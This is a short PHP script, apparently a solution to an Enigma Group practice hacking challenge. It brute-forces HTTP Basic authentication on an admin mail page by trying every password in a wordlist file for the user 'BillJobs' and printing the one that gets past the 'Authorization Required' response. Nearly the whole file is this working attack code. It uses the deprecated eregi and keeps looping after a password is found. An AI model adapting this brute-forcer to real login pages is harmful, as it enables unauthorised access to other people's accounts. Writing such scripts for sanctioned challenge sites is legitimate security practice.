<?php
// easter egg 6 from php programming 7

$url = 'http://challenges.enigmagroup.org/programming/3/image.php';
$cookie = "PHPSESSID=xxxxxxxxx;";

//Starts cURL session with options
$ch = curl_init();											
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_REFERER, $url);
curl_setopt($ch, CURLOPT_COOKIE, $cookie);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

$location = "http://challenges.enigmagroup.org/realistics/nurv/5/mail/admin/index.php";
$wordList = "nurv5List.txt";
$userName = "BillJobs";
 
 echo '<b>.HTpasswd Wordlist Bruter</b><br /><br />';
 
$file = fopen($wordList, "r");
$passList = array();

echo '<hr><b> hit ESC if you want to stop loading the list</b><br /><hr>';

while (($line = fgets($file)) !== false){
	$word = htmlspecialchars(trim($line));
	// ------ debug ------
	//echo 'Attempting: '.$word.'<br />'; 
	 
    $ch = curl_init( $location );
    curl_setopt( $ch, CURLOPT_RETURNTRANSFER, TRUE );
    curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, TRUE );
    curl_setopt( $ch, CURLOPT_HTTPAUTH, CURLAUTH_ANY );
    curl_setopt( $ch, CURLOPT_USERPWD, $userName . ":" . $word );
    $result = curl_exec( $ch );
    curl_close( $ch );
     
    if( !eregi( "Authorization Required", $result ) ){
        echo( "Password was found, it is: {$word}" );
    }
}
echo '<br /><br /> ---END OF FILE ---<br /><br />';
fclose($file);
?>
